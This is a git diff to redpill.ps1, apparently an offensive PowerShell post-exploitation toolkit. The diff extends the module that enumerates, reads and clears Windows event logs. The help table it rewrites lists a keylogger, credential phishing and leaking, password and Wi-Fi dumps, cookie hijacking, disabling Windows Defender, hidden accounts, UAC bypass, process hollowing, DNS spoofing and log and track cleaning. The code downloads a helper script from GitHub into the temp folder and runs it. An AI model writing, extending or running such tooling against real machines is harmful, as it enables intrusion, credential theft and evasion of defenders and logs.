@@ -79,7 +79,7 @@
    [string]$Date="false", [string]$ADS="false", [string]$Help="false",
    [string]$Exec="false", [string]$InTextFile="false", [int]$Delay='1',
    [string]$StreamData="false", [int]$Rate='1', [int]$TimeOut='5',
-   [int]$BeaconTime='10', [int]$Interval='1', [int]$NewEst='10',
+   [int]$BeaconTime='10', [int]$Interval='1', [int]$NewEst='3',
    [int]$Volume='88', [int]$Screenshot='0', [int]$Timmer='10',
    [string]$FolderRigths="false", [string]$GroupName="false",
    [string]$Extension="false", [string]$FilePath="false",
@@ -104,7 +104,8 @@
    [string]$IconSet="False",
    [string]$Sponsor="false",
    [string]$UacMe="false",
-   [string]$Verb="false"
+   [string]$Verb="false",
+   [string]$Id="false"
 )
 
 
@@ -150,45 +151,45 @@ If($Help -ieq "Parameters"){
 
 Write-Host "  Syntax : powershell -File redpill.ps1 [ -Parameter ] [ Argument ]"
 Write-Host "  Example: powershell -File redpill.ps1 -SysInfo Verbose -Screenshot 2"
-Write-Host "`n  P4rameters        @rguments            Descripti0n" -ForegroundColor Green
-Write-Host "  ---------------   ------------         ---------------------------------------"
+Write-Host "`n  P4rameters        @rguments                Descripti0n" -ForegroundColor Green
+Write-Host "  ---------------   ------------             ---------------------------------------"
 $ListParameters = @"
-  -SysInfo          Enum|Verbose         Quick System Info OR Verbose Enumeration
-  -GetConnections   Enum|Verbose         Enumerate Remote Host Active TCP Connections
-  -GetDnsCache      Enum|Clear           Enumerate\Clear remote host DNS cache entrys
-  -GetInstalled     Enum                 Enumerate Remote Host Applications Installed
-  -GetProcess       Enum|Kill|Tokens     Enumerate OR Kill Remote Host Running Process(s)
-  -GetTasks         Enum|Create|Delete   Enumerate\Create\Delete Remote Host Running Tasks
-  -GetLogs          Enum|Verbose|Clear   Enumerate eventvwr logs OR Clear All event logs
-  -GetBrowsers      Enum|Verbose|Creds   Enumerate Installed Browsers and Versions OR Verbose 
-  -Screenshot       1                    Capture 1 Desktop Screenshot and Store it on %TMP%
-  -Camera           Enum|Snap            Enum computer webcams OR capture default webcam snapshot 
-  -StartWebServer   Python|Powershell    Downloads webserver to %TMP% and executes the WebServer.
-  -Keylogger        Start|Stop           Start OR Stop recording remote host keystrokes
-  -MouseLogger      Start                Capture Screenshots of Mouse Clicks for 10 seconds
-  -PhishCreds       Start|Brute          Promp current user for a valid credential and leak captures
-  -GetPasswords     Enum|Dump            Enumerate passwords of diferent locations {Store|Regedit|Disk}
-  -WifiPasswords    Dump|ZipDump         Enum Available SSIDs OR ZipDump All Wifi passwords
-  -EOP              Enum|Verbose         Find Missing Software Patchs for Privilege Escalation
-  -ADS              Enum|Create|Exec|Clear Hidde scripts {txt|bat|ps1|exe} on `$DATA records (ADS)
-  -BruteZip         `$Env:TMP\arch.zip    Brute force Zip archives with the help of 7z.exe
-  -Upload           script.ps1           Upload script.ps1 from attacker apache2 webroot
-  -Persiste         `$Env:TMP\script.ps1  Persiste script.ps1 on every startup {BeaconHome}
-  -CleanTracks      Clear|Paranoid       Clean disk artifacts left behind {clean system tracks}
-  -AppLocker        Enum|WhoAmi|TestBat  Enumerate AppLocker Directorys with weak permissions
-  -FileMace         `$Env:TMP\test.txt    Change File Mace {CreationTime,LastAccessTime,LastWriteTime}
-  -MetaData         `$Env:TMP\test.exe    Display files \ applications description (metadata)
-  -PEHollow         `$Env:TMP\test.exe    PE Process Hollowing {impersonate explorer.exe as parent}
-  -MsgBox           "Hello World."       Spawns "Hello World." msgBox on local host {wscriptComObject}
-  -SpeakPrank       "Hello World."       Make remote host speak user input sentence {prank}
-  -PingSweep        Enum|Verbose         Enumerate active IP Addr (and ports) of Local Lan
-  -NetTrace         Enum                 Agressive sytem enumeration with netsh {native}
-  -DnsSpoof         Enum|Redirect|Clear  Redirect Domain Names to our Phishing IP address
-  -DisableAV        Query|Start|Stop     Disable Windows Defender Service (WinDefend)
-  -HiddenUser       Query|Create|Delete  Query \ Create \ Delete Hidden User Accounts
-  -CsOnTheFly       https://../script.cs Download\Compile (to exe) and exec CS scripts
-  -CookieHijack     Dump|History         Edge|Chrome browser Cookie Hijacking tool
-  -UacMe            Bypass|Elevate|Clean UAC bypass|EOP by dll reflection! (cmstp.exe)
+  -SysInfo          Enum|Verbose             Quick System Info OR Verbose Enumeration
+  -GetConnections   Enum|Verbose             Enumerate Remote Host Active TCP Connections
+  -GetDnsCache      Enum|Clear               Enumerate\Clear remote host DNS cache entrys
+  -GetInstalled     Enum                     Enumerate Remote Host Applications Installed
+  -GetProcess       Enum|Kill|Tokens         Enumerate OR Kill Remote Host Running Process(s)
+  -GetTasks         Enum|Create|Delete       Enumerate\Create\Delete Remote Host Running Tasks
+  -GetLogs          Enum|Verbose|Yara|Clear  Enumerate eventvwr logs OR Clear All event logs
+  -GetBrowsers      Enum|Verbose|Creds       Enumerate Installed Browsers and Versions OR Verbose 
+  -Screenshot       1                        Capture 1 Desktop Screenshot and Store it on %TMP%
+  -Camera           Enum|Snap                Enum computer webcams OR capture default webcam snapshot 
+  -StartWebServer   Python|Powershell        Downloads webserver to %TMP% and executes the WebServer.
+  -Keylogger        Start|Stop               Start OR Stop recording remote host keystrokes
+  -MouseLogger      Start                    Capture Screenshots of Mouse Clicks for 10 seconds
+  -PhishCreds       Start|Brute              Promp current user for a valid credential and leak captures
+  -GetPasswords     Enum|Dump                Enumerate passwords of diferent locations {Store|Regedit|Disk}
+  -WifiPasswords    Dump|ZipDump             Enum Available SSIDs OR ZipDump All Wifi passwords
+  -EOP              Enum|Verbose             Find Missing Software Patchs for Privilege Escalation
+  -ADS              Enum|Create|Exec|Clear   Hidde scripts {txt|bat|ps1|exe} on `$DATA records (ADS)
+  -BruteZip         `$Env:TMP\arch.zip        Brute force Zip archives with the help of 7z.exe
+  -Upload           script.ps1               Upload script.ps1 from attacker apache2 webroot
+  -Persiste         `$Env:TMP\script.ps1      Persiste script.ps1 on every startup {BeaconHome}
+  -CleanTracks      Clear|Paranoid           Clean disk artifacts left behind {clean system tracks}
+  -AppLocker        Enum|WhoAmi|TestBat      Enumerate AppLocker Directorys with weak permissions
+  -FileMace         `$Env:TMP\test.txt        Change File Mace {CreationTime,LastAccessTime,LastWriteTime}
+  -MetaData         `$Env:TMP\test.exe        Display files \ applications description (metadata)
+  -PEHollow         `$Env:TMP\test.exe        PE Process Hollowing {impersonate explorer.exe as parent}
+  -MsgBox           "Hello World."           Spawns "Hello World." msgBox on local host {wscriptComObject}
+  -SpeakPrank       "Hello World."           Make remote host speak user input sentence {prank}
+  -PingSweep        Enum|Verbose             Enumerate active IP Addr (and ports) of Local Lan
+  -NetTrace         Enum                     Agressive sytem enumeration with netsh {native}
+  -DnsSpoof         Enum|Redirect|Clear      Redirect Domain Names to our Phishing IP address
+  -DisableAV        Query|Start|Stop         Disable Windows Defender Service (WinDefend)
+  -HiddenUser       Query|Create|Delete      Query \ Create \ Delete Hidden User Accounts
+  -CsOnTheFly       https://../script.cs     Download\Compile (to exe) and exec CS scripts
+  -CookieHijack     Dump|History             Edge|Chrome browser Cookie Hijacking tool
+  -UacMe            Bypass|Elevate|Clean     UAC bypass|EOP by dll reflection! (cmstp.exe)
 
 "@;
 echo $ListParameters > $Env:TMP\mytable.mt
@@ -591,7 +592,7 @@ If($GetTasks -ieq "Enum" -or $GetTasks -ieq "Create" -or $GetTasks -ieq "Delete"
 }
 
 If($GetLogs -ieq "Enum" -or $GetLogs -ieq "Clear" -or $GetLogs -ieq "Verbose" -or $getLogs -ieq "Yara"){
-If($NewEst -lt "5" -or $NewEst -gt "80"){$NewEst = "10"} ## Set the max\min logs to display
+If($NewEst -lt "1"){$NewEst = "3"} ## Set the min logs to display
 
    <#
    .SYNOPSIS
@@ -609,7 +610,7 @@ If($NewEst -lt "5" -or $NewEst -gt "80"){$NewEst = "10"} ## Set the max\min logs
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetLogs Verbose
-      List the newest 10(default) Powershell\Application\System entrys
+      List the newest 3(default) Powershell\Application\System entrys
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetLogs Verbose -NewEst 28
@@ -637,20 +638,26 @@ If($NewEst -lt "5" -or $NewEst -gt "80"){$NewEst = "10"} ## Set the max\min logs
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetLogs.ps1 -Destination $Env:TMP\GetLogs.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\GetLogs.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 7){## Corrupted download detected => DefaultFileSize: 7,599609375/KB
+      If($SizeDump -lt 20){## Corrupted download detected => DefaultFileSize: 20,5361328125/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\GetLogs.ps1"){Remove-Item -Path "$Env:TMP\GetLogs.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
       }   
    }
 
-   ## Run auxiliary module -NewEst
+   ## Run auxiliary module
    If($GetLogs -ieq "Enum"){
       powershell -File "$Env:TMP\GetLogs.ps1" -GetLogs Enum
    }ElseIf($GetLogs -ieq "Verbose"){
-      powershell -File "$Env:TMP\GetLogs.ps1" -GetLogs Verbose -NewEst $NewEst
+      powershell -File "$Env:TMP\GetLogs.ps1" -GetLogs Verbose -NewEst "$NewEst"
    }ElseIf($GetLogs -ieq "Yara"){
-      powershell -File "$Env:TMP\GetLogs.ps1" -GetLogs Yara -NewEst $NewEst
+
+      If($Verb -ne "False"){
+         powershell -File "$Env:TMP\GetLogs.ps1" -GetLogs Yara -Verb "$Verb" -NewEst "$NewEst" -Id "$Id"
+      }Else{
+         powershell -File "$Env:TMP\GetLogs.ps1" -GetLogs Yara -NewEst "$NewEst" -Id "$Id"
+      }
+
    }ElseIf($GetLogs -ieq "Clear"){
       powershell -File "$Env:TMP\GetLogs.ps1" -GetLogs Clear
    }
@@ -2937,44 +2944,72 @@ $HelpParameters = @"
 
 "@;
 Write-Host "$HelpParameters"
-}ElseIf($Help -ieq "GetLogs" -or $Help -ieq "NewEst"){
+}ElseIf($Help -ieq "GetLogs" -or $Help -ieq "NewEst" -or $Help -ieq "Id"){
 $HelpParameters = @"
 
    <#!Help.
    .SYNOPSIS
       Author: @r00t-3xp10it
-      Helper - Enumerate\Clear eventvwr logs
+      Helper - Enumerate\Read\Clear eventvwr logfiles!
+
+   .DESCRIPTION
+      This cmdlet displays a list of ALL eventvwr categorie entrys and there
+      indevidual logfiles counter, it also list logfiles on categories sutch as:
+      'Windows Powershell', 'PowerShell/Operational', 'Bits-Client/Operacional'
+      on -GetLogs "verbose" mode, and displays the contents of logfiles based
+      on there ID number if sellected -GetLogs "Yara" parameter!
 
    .NOTES
       Required Dependencies: wevtutil {native}
-      The Clear @argument requires Administrator privs
-      on shell to be abble to 'Clear' Eventvwr entrys.
+      The Clear @argument requires administrator privileges!
+      To list multiple Id's then split the numbers by a [,] char!
+      Example: .\GetLogs.ps1 -GetLogs Yara -Id "59,60,300,400,8002"
+      If none ID or VERB paramets are used together with 'YARA' @argument,
+      then this cmdlet will scan pre-defined event paths and ID's numbers!
 
    .Parameter GetLogs
-      Accepts arguments: Enum, Verbose,Yara, Clear
+      Accepts argument: Enum, Verbose, Yara, Clean
 
    .Parameter NewEst
-      How many logfiles (newest) to be displayed (default: 10)
+      How many event logs to display int value (default: 3)
+
+   .Parameter Id
+      List logfiles by is EventID number!
+
+   .Parameter Verb
+      Accepts 'ONE' Eventvwr registry path to be scanned! 
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -GetLogs Enum
+      PS C:\> .\redpill.ps1 -GetLogs Enum
       Lists ALL eventvwr categorie entrys
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -GetLogs Verbose
-      List the newest 10 Powershell\Application\System entrys
+      PS C:\> .\redpill.ps1 -GetLogs Verbose
+      List newest 3 (default) Powershell\Application\System entrys!
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -GetLogs Verbose -NewEst 28
-      List the newest 28 Eventvwr Powershell\Application\System entrys
+      PS C:\> .\redpill.ps1 -GetLogs Verbose -NewEst 8
+      List newest 8 Eventvwr Powershell\Application\System entrys!
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -GetLogs Yara -NewEst 28
-      List -NewEst "28" eventvwr logfiles with Id: 59,300,4104
+      PS C:\> .\redpill.ps1 -GetLogs Yara -NewEst 28
+      List newest 28 logs using cmdlet default Id's and categories!
+
+   .EXAMPLE
+      PS C:\> .\redpill.ps1 -GetLogs Yara -NewEst 13 -Id 59
+      List newest 13 logfiles with Id: 59 using cmdlet default categories!
+
+   .EXAMPLE
+      PS C:\> .\redpill.ps1 -GetLogs Yara -verb "system" -Id 1 -NewEst 10
+      List newest 10 logfiles of 'system' categorie with id: 1
+
+   .EXAMPLE
+      PS C:\> .\redpill.ps1 -GetLogs Yara -Verb "Microsoft-Windows-NetworkProfile/Operational" -id 10001
+      List newest 3 (default) logfiles of 'NetworkProfile/Operational' categorie with Id: 10001
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetLogs Clear
-      Remark: Clear @arg requires Administrator privs on shell
+      Remark: Clear function requires Administrator privileges!
 
    .OUTPUTS
       Max(K) Retain OverflowAction    Entries Log                   
